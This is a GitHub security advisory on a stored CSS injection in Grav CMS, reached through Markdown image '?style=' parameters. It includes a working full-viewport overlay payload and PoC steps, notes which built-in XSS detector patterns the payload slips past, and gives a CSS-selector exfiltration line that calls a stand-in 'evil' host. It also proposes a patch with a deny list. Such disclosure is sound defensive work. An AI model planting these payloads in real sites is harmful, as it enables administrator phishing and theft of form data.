# [M] Grav: Stored CSS injection via Markdown image ?style=… reaches MediaObjectTrait::style() — incomplete patch of GHSA-r7fx-8g49-7hhr

## Summary
Severity: Medium
Advisory: GHSA-pmf8-g7c8-7v54
CVE: CVE-2026-55890
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-pmf8-g7c8-7v54
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.0-rc.9

## Details
## Summary

The fix for **GHSA-r7fx-8g49-7hhr / CVE-2026-42841** (Stored XSS via Markdown media `attribute()` action) is incomplete. The maintainer patched `MediaObjectTrait::attribute()` to deny dangerous attribute names (event handlers, `style`, `xmlns`, `srcdoc`, `formaction`) but the sibling `MediaObjectTrait::style()` method is reachable through the **same Markdown excerpt-action pipeline** and writes editor-controlled strings straight into the rendered `<img style="…">` attribute with **no sanitization**.

Any user with `admin.pages` permission (e.g. an editor) can save Markdown like:

```markdown
![logo](image.png?style=position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999)
```

which renders to a stored-CSS payload that any higher-privileged viewer (administrator, super-admin, reviewer) loads in their authenticated session. Same trust boundary, same victim, same attacker, same Markdown input vector as the patched GHSA-r7fx-8g49-7hhr issue — the fix simply patched the `attribute()` entry point and missed the `style()` sibling.

## Affected versions

Vulnerable at HEAD across every currently-shipping branch (verified 2026-06-15):

| Branch / tag | `MediaObjectTrait::style()` |
|---|---|
| `develop` (`f4c0f42`) | unpatched |
| `2.0` (`96e1d2d`) | unpatched |
| `2.0.0-rc.8` (latest 2.0 RC tag) | unpatched |
| `1.7.52` (latest 1.7 stable) | unpatched |

Per `SECURITY.md`, this advisory targets the **2.0 line** (publisher-level exploit, not eligible for 1.7 backport per the project's stated policy).

## Trust boundary

Per the project's `SECURITY.md`:

> A vulnerability is when an actor can **escape the trust scope of their role**: a publisher whose stored content compromises an admin session, an unauthenticated visitor who reaches a privileged sink, an account at any tier that gains capabilities it was not granted.

An editor authoring Markdown is operating within their role. A higher-privilege admin loading that editor's page in their authenticated session and getting attacker-controlled CSS painted into their browser is **across the trust boundary** — the same framing that was accepted for GHSA-r7fx-8g49-7hhr (MODERATE) and GHSA-c2q3-p4jr-c55f (MODERATE).

## Details

### Original GHSA-r7fx-8g49-7hhr fix (commit `5a12f9be8`, 2026-04-23)

```php
public function attribute($attribute = null, $value = '')
{
    if (empty($attribute) || !is_string($attribute)) {
        return $this;
    }
    if (!self::isSafeAttributeName($attribute)) {
        return $this;
    }
    $this->attributes[$attribute] = $value;
    return $this;
}

private static function isSafeAttributeName(string $name): bool
{
    if (!preg_match('/^[A-Za-z][A-Za-z0-9_:.\-]*$/', $name)) {
        return false;
    }
    $lower = strtolower($name);
    if (str_starts_with($lower, 'on')) {        // event handlers
        return false;
    }
    $denylist = ['style', 'xmlns', 'srcdoc', 'formaction'];
    return !in_array($lower, $denylist, true);
}
```

`style` is the **second-named entry** on the denylist — the maintainer explicitly recognised that editor-supplied `style` was dangerous when arriving via the `attribute()` action. The fix simply didn't reach the parallel sink.

### The unpatched sibling: `MediaObjectTrait::style()` (line 519)

```php
/**
 * Allows to add an inline style attribute from Markdown or Twig
 * Example: ![Example](myimg.png?style=float:left)
 */
public function style($style)
{
    $this->styleAttributes[] = rtrim($style, ';') . ';';
    return $this;
}
```

The function is unchanged before, during, and after the GHSA-r7fx-8g49-7hhr fix. The PHPDoc on the very next line names the Markdown invocation form (`?style=…`). The `rtrim` is for clean concatenation, not security.

`$styleAttributes` is concatenated and assigned to `attributes['style']` in `parsedownElement()` (lines 242–251):

```php
$style = '';
foreach ($this->styleAttributes as $key => $value) {
    if (is_numeric($key)) {        // editor-supplied entries are numeric-keyed
        $style .= $value;
    } else {
        $style .= $key . ': ' . $value . ';';
    }
}
if ($style) {
    $attributes['style'] = $style;
}
```

Parsedown then runs `htmlspecialchars` on the value (so quote-breakout into a new attribute is blocked), but arbitrary CSS as the value is enough.

### Source → sink trace

The Markdown processor wires query-string keys to method calls on the `Medium` object (`system/src/Grav/Common/Page/Markdown/Excerpts.php:262`):

```php
foreach ($actions as $action) {
    $matches = [];
    if (preg_match('/\[(.*)\]/', (string) $action['params'], $matches)) {
        $args = [explode(',', $matches[1])];
    } else {
        $args = explode(',', (string) $action['params']);
    }
    $medium = call_user_func_array([$medium, $action['method']], $args);
}
```

`?style=position:fixed;top:0;left:0` becomes `$medium->style('position:fixed;top:0;left:0')`.

### Save-side XSS detector misses the payload

`AdminController::savePage()` runs `Security::detectXssFromArray()` on `data[content]` before persisting (`classes/plugin/AdminController.php:1402`). All five default patterns miss the Markdown form:

- `on_events`: requires `<…on*=` in source.
- `invalid_protocols`: requires `javascript:`/`data:`/etc. — the phishing-overlay payload uses none.
- `moz_binding`: requires `-moz-binding:` literally.
- `html_inline_styles`: requires `<…style=…(url:|x:expression)`; Markdown source has no `<` and no `url:`.
- `dangerous_tags`: requires `<svg`/`<script`/etc.

Save proceeds, the payload persists, the CSS is rendered to every viewer.

## Impact

- **Phishing overlay** — full-viewport `position:fixed` covering the admin UI with attacker-controlled background/content; admin clicks intended actions into the attacker's overlay.
- **UI redress / clickjacking** — invisible overlays hijacking admin button clicks.
- **CSS-selector data exfiltration** — `input[value^="a"] { background: url(//evil/log?c=a) }` against form fields the higher-privileged viewer interacts with.
- **Persistent admin-UI denial-of-service** — `position:fixed; background:white` covers the page until the offending content is removed by hand on the server.

The stored payload reaches every user who views the editor's page — including administrators previewing pending changes.

## Proof of concept

A deterministic end-to-end PoC against a real Grav install ships with the finding (`repro.sh`). Steps:

1. Log in as an editor (`admin.pages` + `admin.pages.update`, no `admin.super`).
2. Upload a benign image to a target page.
3. Save the page with the Markdown payload `![alt](image?style=position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999)`.
4. Visit the public page; observe the `<img style="…">` carrying the unsanitised CSS.

## Suggested fix

Apply the same denylist + identifier-shape gate to `style()` that `isSafeAttributeName()` enforces for `attribute()`:

```diff
 public function style($style)
 {
+    if (!is_string($style) || !self::isSafeStyleValue($style)) {
+        return $this;
+    }
     $this->styleAttributes[] = rtrim($style, ';') . ';';
     return $this;
 }

+/**
+ * Editor-controlled style values arrive via Markdown `?style=…` and reach
+ * the rendered `<img style="…">` attribute verbatim. Limit to a conservative
+ * set of CSS that themes legitimately use from content (sizing, float,
+ * margin, etc.) and reject anything that opens a phishing-overlay or
+ * data-exfil primitive. Matches the spirit of the attribute() denylist
+ * from GHSA-r7fx-8g49-7hhr — same trust boundary, sibling sink.
+ */
+private static function isSafeStyleValue(string $css): bool
+{
+    $css = strtolower($css);
+    // Deny: phishing-overlay positioning, CSS-selector exfil sinks
+    // (background/content url(...)), expression() (legacy IE),
+    // -moz-binding (legacy FF), behavior: url() (IE).
+    $deny = ['position:', '@import', 'url(', 'expression(',
+             '-moz-binding', 'behavior:', 'z-index:', 'fixed', 'absolute'];
+    foreach ($deny as $needle) {
+        if (str_contains($css, $needle)) {
+            return false;
+        }
+    }
+    return (bool) preg_match('/^[A-Za-z0-9 :;%.,\-#\/]*$/', $css);
+}
```

Alternatively, deprecate the Markdown `?style=…` action entirely — themes can still set inline styles from PHP, but accepting attacker-controlled CSS from page content was always a footgun.

Defense in depth: extend `Security::detectXss()`'s `html_inline_styles` rule to also match Markdown-form `?style=` query parameters in `data[content]` on save.

## References

- Original advisory: GHSA-r7fx-8g49-7hhr
- Fix commit: `5a12f9be8` (`system/src/Grav/Common/Media/Traits/MediaObjectTrait.php`)
- Unpatched code: `system/src/Grav/Common/Media/Traits/MediaObjectTrait.php` lines 519–524
- Project security policy: `SECURITY.md` (trust-boundary severity model)

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-pmf8-g7c8-7v54
- https://github.com/getgrav/grav/commit/5a12f9be8
- https://github.com/getgrav/grav
